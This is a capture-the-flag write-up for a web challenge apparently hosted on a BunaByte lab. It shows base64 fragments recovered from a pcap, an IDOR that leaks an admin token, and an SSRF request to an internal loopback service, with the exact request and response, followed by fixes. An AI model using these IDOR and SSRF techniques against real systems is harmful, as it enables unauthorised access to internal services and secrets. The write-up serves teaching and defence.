---
title: "Jebena — Buna Direct SSRF"
author: "mr.p4rr0t"
tags:
  - "mr.p4rr0t"
  - "ctf"
  - "web"
  - "bunabyte"
category: "web"
platform: "BunaByte"
---

# Jebena / Buna Direct — Writeup

> **Author:** mr.p4rr0t • **Tag:** `#mr.p4rr0t`

![Jebena Leak](../../pics/jebena%20leak.png)

**Flag:** `[REDACTED]`

## Artifacts
- Lab: `https://74174680-f537-4389-b78f-7fce0f471970.lab.bunabyte.com`
- Capture: `jebena_leak_traffic.pcap` (16 one-way HTTP POSTs)
- Admin token: `adm_0bcbee15de7f49fcdb9c91e18c57b2cd9c166483`

## Step 1 — pcap: hidden base64 in the roast log
All 16 packets are `10.0.4.15 -> 10.0.4.201:51000`, `POST /webhook/roast-log`.
Only BATCH-1077, BATCH-1079 and BATCH-1081 carry `note_b64`:

```
dGgzX3IwND    V0X2wwZ19u    M3Yzcl9sMTM1
```

They are **slices of one base64 string**, cut on offsets that do not align to
4-character groups. Frame 9 alone decodes to garbage (`57 45 f6 c3 06 75 f6`)
— that is the trap. Join first, then decode:

```
dGgzX3IwNDV0X2wwZ19uM3Yzcl9sMTM1 -> th3_r045t_l0g_n3v3r_l135
```

Fragment 1: `th3_r045t_l0g_n3v3r_l135` ("the roast log never lies").

## Step 2 — IDOR leaks the admin token
The login page publishes `player` / `buna123`. `/orders/<id>` renders the
owner's "Session Token" but never checks ownership. Order `1000` belongs to
`admin_kebede` and leaks:

```
adm_0bcbee15de7f49fcdb9c91e18c57b2cd9c166483
```

That value is accepted as `X-Admin-Token` on
`POST /admin/export-roast-profile` (403 without it, 400 `profile_url required`
with it).

## Step 3 — SSRF to the internal warehouse service
`POST /admin/export-roast-profile` fetches a caller-supplied `profile_url` and
returns the body. Port scan through the SSRF found:

- `127.0.0.1:5000` — the portal itself
- `127.0.0.1:8080` — `warehouse-inventory-internal`
- `127.0.0.1:8081` — `legacy-inventory-v1` (decoy: `not_the_real_one`)

Request:

```http
POST /admin/export-roast-profile
X-Admin-Token: adm_0bcbee15de7f49fcdb9c91e18c57b2cd9c166483
Content-Type: application/json

{"profile_url":"http://127.0.0.1:8080/internal/vendor-keys"}
```

Response:

```json
{"fragment":"55rf_p1v0t_","internal_note":"rotate_key_before_harvest","vendor":"Sidamo Coffee Exporters"}
```

Fragment 2: `55rf_p1v0t_` ("ssrf pivot"; trailing underscore signals the next
piece).

## Step 4 — Assemble
```
[REDACTED]
= [REDACTED]
```

## Fixes
- Enforce object ownership on `/orders/<id>`; never render session tokens.
- SSRF: allowlist destinations, block loopback/RFC1918/link-local, do not
  return fetched bodies.
- Do not store secrets as split base64 inside log payloads.
